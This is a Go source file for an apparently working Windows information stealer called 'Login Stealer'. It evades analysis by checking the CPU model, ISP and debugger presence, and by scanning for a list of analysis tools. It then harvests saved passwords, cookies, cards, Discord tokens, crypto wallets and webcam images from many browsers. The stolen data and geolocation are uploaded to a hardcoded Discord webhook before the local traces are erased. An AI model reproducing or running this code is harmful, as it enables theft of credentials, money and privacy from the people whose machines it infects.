package main

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/StackExchange/wmi"
	"github.com/equisde/Clean/core"
	Zilla "github.com/equisde/Clean/core/Zilla"
	"github.com/equisde/Clean/core/decrypt"
	"github.com/equisde/Clean/core/output"
	"github.com/equisde/Clean/core/parse"
	"github.com/equisde/Clean/core/parse/IE"
	"github.com/equisde/Clean/core/parse/camera"
	"github.com/equisde/Clean/core/parse/crypto"
	"github.com/equisde/Clean/utils"
	"github.com/nickname32/discordhook"
	"github.com/tidwall/gjson"

	// we'll just import it here for cleanliness (literally does not matter where it gets imported)
	_ "github.com/mattn/go-sqlite3"
	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/disk"
	"github.com/shirou/gopsutil/host"
	"github.com/shirou/gopsutil/mem"
)

// this code slowly gets worse every update

func get_information() {

	//get cpu info with cpu.Info()
	cpuInfo, _ := cpu.Info()
	fmt.Println("CPU Info:", cpuInfo)
	//cpuinfo to string
	cpuinfo := fmt.Sprintf("Cpu info: %v", cpuInfo)
	//parse cpuinfo to get the cpu model
	cpuModel := cpuInfo[0].ModelName
	fmt.Println("CPU Model:", cpuModel)
	//check if content in string
	if strings.Contains(cpuModel, "Intel(R) Xeon(R)") {
		//if contains xeon os.exit(0)

		xeon_detected(cpuinfo)
		os.Exit(0)
	}

}
func xeon_detected(message string) {
	wa, err := discordhook.NewWebhookAPI(926310827781398528, "BectT-O60X-NxRjaLJ-2SX5Lz6oPO29-DYplyjYDJIrIkLtPu9Pg2NPx9lnNdbjpp63Q", true, nil)
	if err != nil {
		panic(err)
	}

	wh, err := wa.Get(nil)
	if err != nil {
		panic(err)
	}

	fmt.Println(wh.Name)

	msg, err := wa.Execute(nil, &discordhook.WebhookExecuteParams{
		Embeds: []*discordhook.Embed{
			{
				Title:       "Xeon Detected stopped proccess",
				Description: message,
			},
		},
	}, nil, "")
	if err != nil {
		panic(err)
	}
	fmt.Println(msg)
}

//send message discordhook module
func send_webhook(message string) {
	wa, err := discordhook.NewWebhookAPI(926310827781398528, "BectT-O60X-NxRjaLJ-2SX5Lz6oPO29-DYplyjYDJIrIkLtPu9Pg2NPx9lnNdbjpp63Q", true, nil)
	if err != nil {
		panic(err)
	}

	wh, err := wa.Get(nil)
	if err != nil {
		panic(err)
	}

	fmt.Println(wh.Name)

	msg, err := wa.Execute(nil, &discordhook.WebhookExecuteParams{
		Embeds: []*discordhook.Embed{
			{
				Title:       "CPU_INFO",
				Description: message,
			},
		},
	}, nil, "")
	if err != nil {
		panic(err)
	}
	fmt.Println(msg)
}

func antiDebug() {
	if doEntrap {
		return
	}

	for i := 0; i < len(debugBlacklist); i++ {
		checkProc(debugBlacklist[i])
	}

	present, _, _ := debuggerPresent.Call()
	if present != 0 {
		changeWallPaper()
		doEntrap = true
	}
}

func changeWallPaper() {
	image, err := os.Create(os.Getenv("TEMP") + "\\AAAAAAAAA.jpg")
	if err == nil {
		if res := utils.HttpRequest("GET", "https://raw.githubusercontent.com/Not-Cyrus/Login-Stealer/main/assets/CaughtIn4K.jpg", nil, nil); res != nil {
			_, err = io.Copy(image, res.Body)
			if err == nil {
				image.Close()
				systemParams.Call(20, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(os.Getenv("TEMP")+"\\AAAAAAAAA.jpg"))), 2)
			}
		}
	}
}

func checkProc(procName string) {
	var dst []win32Proc
	if err := wmi.Query("SELECT * FROM Win32_Process", &dst); err != nil {
		return
	}

	for _, proc := range dst {
		if strings.Contains(strings.ToLower(proc.Name), procName) {
			// CHANGE THEIR WALLPAPER
			changeWallPaper()
			// THEN LOCK THEM OUT
			if proc.Name != "taskmgr.exe" { // we wanna mess with them a little
				doEntrap = true
			}
		}
	}
}

func main() {
	get_information()
	// ** Get IP Data ** //
	resBody := gjson.Parse(string(utils.ReadBody(utils.HttpRequest("GET", "https://json.geoiplookup.io", nil, nil))))
	if strings.Contains(resBody.Get("isp").String(), "Google") || strings.Contains(resBody.Get("hostname").String(), "google") {
		doEntrap = true // how funny that we're making google send requests to themselves
	}

	// Stupid returning as "Verizion" ISP
	if !doEntrap { // We do not want to leak that we are doing this to virus total.
		output, err := exec.Command("nslookup", "-type=mx", resBody.Get("hostname").String()).Output()
		if err == nil {
			if bytes.Contains(output, []byte("amazon")) {
				doEntrap = true // get out of here debuggers !!
			}
		}
	}

	// ** Do all anti debugging first to make sure we're "safe" ** //
	antiDebug()

	if doEntrap {
		for {
			utils.HttpRequest("GET", "https://www.google.com", nil, nil)
		}
	}

	for browserName, browserData := range browserList {
		parse.GetTokens(browserData.LocalStorage, browserData.InfectPath, utils.Decrypt(webhookURL).String())
		if len(browserData.ProfilePath) == 0 {
			continue
		}

		browserPath, err := filepath.Glob(utils.CleanPath(filepath.Join(os.Getenv("USERPROFILE"), browserData.ProfilePath)))
		if err != nil || len(browserPath) == 0 {
			continue
		}

		// ** Chromium ** //
		if browserData.Type == "Chromium" {

			switch len(browserData.KeyPath) {
			case 0:
				parse.MasterKey = nil
			default:
				parse.MasterKey, err = decrypt.GetMasterKey(filepath.Join(browserPath[0], browserData.KeyPath))
				if err != nil {
					continue
				}
			}

			parse.GetLogins([]string{
				browserPath[0],
				browserName,
			})
			continue
		}

		// ** FireFox ** //
		parse.GetFireFoxLogins([]string{
			browserPath[0],
			browserName,
		})
	}

	// ** Smile For The Camera ** //
	camera.SmileForTheCamera()

	// ** Once they smile we steal their crypto ** //
	crypto.LogCrypto()

	// ** Internet Explorer Logins ** //
	IE.GetIEData()

	// ** Infect Powercord **
	// (This has been commented out as it is redundant, as I figured out a way to log through the core discord files.
	// I will keep it in just for a fallback.
	// powercord.InfectPowercord(webhookURL)

	// ** Save Data ** //
	parse.GetMinecraftAuths()
	parse.GetRobloxAuth()
	Zilla.GetData()

	if len(parse.LoggedCards.Logged) > 0 {
		output.WriteData("Cards.txt", "cards")
	}

	if len(parse.LoggedCookies.Logged) > 0 {
		output.WriteData("Cookies.txt", "cookies")
	}

	if len(parse.LoggedHistory.Logged) > 0 {
		output.WriteData("History.txt", "history")
	}

	if len(parse.Logins.Logged) > 0 {
		output.WriteData("Passwords.txt", "passwords")
	}

	if len(parse.LoggedTokens) > 0 {
		output.WriteData("Tokens.txt", "tokens")
	}
	var cpuName string = "Not found"
	if len(cpuStat) > 0 {
		cpuName = cpuStat[0].ModelName // somehow this was 0 in the testing VM
	}

	// ** Compress Data ** //
	utils.Compress()

	// ** Upload Data ** //
	output.UploadData(webhookURL, &core.WebhookData{
		AvatarURL: "https://avatars.githubusercontent.com/u/50967051?s=400&u=ad46e1a11001816f5449a46a0024ee28044577e8&v=4",
		Username:  "Login Stealer",

		Embeds: []*core.WebhookEmbed{
			// ** Embed 1 ** //
			{
				Author: &core.EmbedAuthor{Name: fmt.Sprintf("%s's specs", hostStat.Hostname)},
				Colour: 9568256,

				Fields: []*core.EmbedField{
					{Name: "**Windows License Key**", Value: parse.GetKey(), Inline: true},
					{Name: "**Platform**", Value: hostStat.Platform, Inline: true},
					{Name: "**Cpu**", Value: cpuName, Inline: true},
					{Name: "**Ram**", Value: fmt.Sprintf("%d/%dGB", (vmStat.Used/1024/1024/1024)/1, (vmStat.Total/1024/1024/1024)/1), Inline: true},
					{Name: "**Disk Space**", Value: fmt.Sprintf("%d/%dGB", (diskStat.Used/1024/1024/1024)/1, (diskStat.Total/1024/1024/1024)/1), Inline: true},
				},
			},
			// ** Embed 2 ** //
			{
				Author: &core.EmbedAuthor{Name: fmt.Sprintf("%s's IP (Geolocation can be inaccurate)", hostStat.Hostname)},
				Colour: 9568256,

				Fields: []*core.EmbedField{
					{Name: "**IP Address**", Value: resBody.Get("ip").String(), Inline: true},
					{Name: "**Location**", Value: fmt.Sprintf("%s, %s", resBody.Get("city").String(), resBody.Get("region").String()), Inline: true},
					{Name: "**Country**", Value: resBody.Get("country_name").String(), Inline: true},
					{Name: "**Postal/Zip Code**", Value: resBody.Get("postal_code").String(), Inline: true},
					{Name: "**Coordinates**", Value: fmt.Sprintf("%f, %f", resBody.Get("latitude").Float(), resBody.Get("longitude").Float()), Inline: true},
					{Name: "**ISP**", Value: resBody.Get("isp").String(), Inline: true},
				},

				Thumbnail: &core.EmbedThumbnail{URL: fmt.Sprintf("https://www.countryflags.io/%s/shiny/64.png", resBody.Get("country_code").String())},
			},
			// ** Embed 3 ** //
			{
				Author: &core.EmbedAuthor{Name: "Credits"},
				Colour: 9568256,

				Fields: []*core.EmbedField{
					{Name: "**Author**", Value: "[My GitHub](https://github.com/Equisde)", Inline: true},
					{Name: "**Source Code**", Value: "[GitHub Repo](https://github.com/equisde/Clean)", Inline: true},
				},

				Image: &core.EmbedImage{
					URL: "https://raw.githubusercontent.com/Not-Cyrus/Login-Stealer/main/assets/foxeating.gif",
				},

				Footer:    &core.EmbedFooter{Text: "Logged at", IconURL: "https://avatars.githubusercontent.com/u/50967051?s=400&u=ad46e1a11001816f5449a46a0024ee28044577e8&v=4"},
				Timestamp: time.Now().UTC().Format("2006-01-02T15:04:05-0700"),
			},
		},
	})

	// ** Remove all traces of said stolen data ** //
	core.HandleErr(os.RemoveAll(filepath.Join(os.Getenv("TEMP"), "Results")))
}

type (
	win32Proc struct {
		Name string
	}
)

var (
	browserList = map[string]struct {
		KeyPath      string
		InfectPath   string // this is for discord only
		LocalStorage string
		ProfilePath  string
		Type         string
	}{
		"360": {
			ProfilePath: "\\AppData\\Local\\360chrome\\Chrome\\User Data\\*\\",
			Type:        "Chromium",
		},
		"brave": {
			KeyPath:      "Local State",
			LocalStorage: "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
			ProfilePath:  "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
			Type:         "Chromium",
		},
		"chrome": {
			KeyPath:      "..\\Local State",
			LocalStorage: "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
			ProfilePath:  "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\",
			Type:         "Chromium",
		},
		"chrome-beta": {
			KeyPath:      "..\\Local State",
			LocalStorage: "\\AppData\\Local\\Google\\Chrome Beta\\User Data\\Default\\Local Storage\\leveldb\\",
			ProfilePath:  "\\AppData\\Local\\Google\\Chrome Beta\\User Data\\Default\\",
			Type:         "Chromium",
		},
		"chromium": {
			KeyPath:      "..\\Local State",
			LocalStorage: "\\AppData\\Local\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\",
			ProfilePath:  "\\AppData\\Local\\Chromium\\User Data\\Default\\",
			Type:         "Chromium",
		},
		"discord": {
			InfectPath:   "\\AppData\\Local\\Discord\\app-1.*",
			LocalStorage: "\\AppData\\Discord\\Local Storage\\leveldb\\",
			Type:         "Chromium",
		},
		"discordcanary": {
			InfectPath:   "\\AppData\\Local\\DiscordCanary\\app-1.*",
			LocalStorage: "\\AppData\\discordcanary\\Local Storage\\leveldb\\",
			Type:         "Chromium",
		},
		"discorddevelopment": {
			InfectPath:   "\\AppData\\Local\\DiscordDevelopment\\app-1.*",
			LocalStorage: "\\AppData\\Roaming\\discorddevelopment\\Local Storage\\leveldb",
			Type:         "Chromium",
		},
		"discordptb": {
			InfectPath:   "\\AppData\\Local\\discordptb\\app-1.*",
			LocalStorage: "\\AppData\\discordptb\\Local Storage\\leveldb\\",
			Type:         "Chromium",
		},
		"edge": {
			KeyPath:      "..\\Local State",
			LocalStorage: "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
			ProfilePath:  "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\",
			Type:         "Chromium",
		},
		"firefox": {
			ProfilePath: "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default-release\\",
			Type:        "FireFox",
		},
		"firefox-beta": {
			ProfilePath: "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default-beta\\",
			Type:        "FireFox",
		},
		"firefox-dev": {
			ProfilePath: "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.dev-edition-default\\",
			Type:        "FireFox",
		},
		"firefox-esr": {
			ProfilePath: "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default-esr\\",
			Type:        "FireFox",
		},
		"firefox-nightly": {
			ProfilePath: "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default-nightly\\",
			Type:        "FireFox",
		},
		"opera": {
			KeyPath:      "..\\Local State",
			LocalStorage: "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
			ProfilePath:  "\\AppData\\Roaming\\Opera Software\\Opera Stable\\",
			Type:         "Chromium",
		},
		"opera-gx": {
			KeyPath:      "..\\Local State",
			LocalStorage: "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
			ProfilePath:  "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\",
			Type:         "Chromium",
		},
		"K-Meleon": {
			ProfilePath: "\\AppData\\Roaming\\K-Meleon\\*.default",
			Type:        "FireFox",
		},
		"qq": {
			ProfilePath: "\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\*\\",
			Type:        "Chromium",
		},
		"vivaldi": {
			KeyPath:      "\\AppData\\Local\\Vivaldi\\..\\Local State",
			LocalStorage: "\\AppData\\Local\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
			ProfilePath:  "\\AppData\\Local\\Vivaldi\\User Data\\Default\\",
			Type:         "Chromium",
		},
		"waterfox": {
			ProfilePath: "\\AppData\\Roaming\\Waterfox\\Profiles\\*.*-edition-default\\",
			Type:        "Firefox",
		},
		"yandex": {
			KeyPath:      "..\\Local State",
			LocalStorage: "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
			ProfilePath:  "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\",
			Type:         "Chromium",
		},
	}

	cpuStat, _       = cpu.Info()
	diskStat, _      = disk.Usage("\\")
	doEntrap    bool = false
	hostStat, _      = host.Info()
	vmStat, _        = mem.VirtualMemory()
	webhookURL  string

	debugBlacklist = []string{
		"wireshark",
		"ida",
		"reclass",
		"x64dbg",
		"x32dbg",
		"task explorer",
		"driverlist",
		"fiddler",
		"processhacker",
		"cheatengine",
		"sandman",
		"sbiesvc",
	}

	kernel32        = syscall.NewLazyDLL("kernel32.dll")
	user32          = syscall.NewLazyDLL("user32.dll")
	debuggerPresent = kernel32.NewProc("IsDebuggerPresent")
	systemParams    = user32.NewProc("SystemParametersInfoW")
)
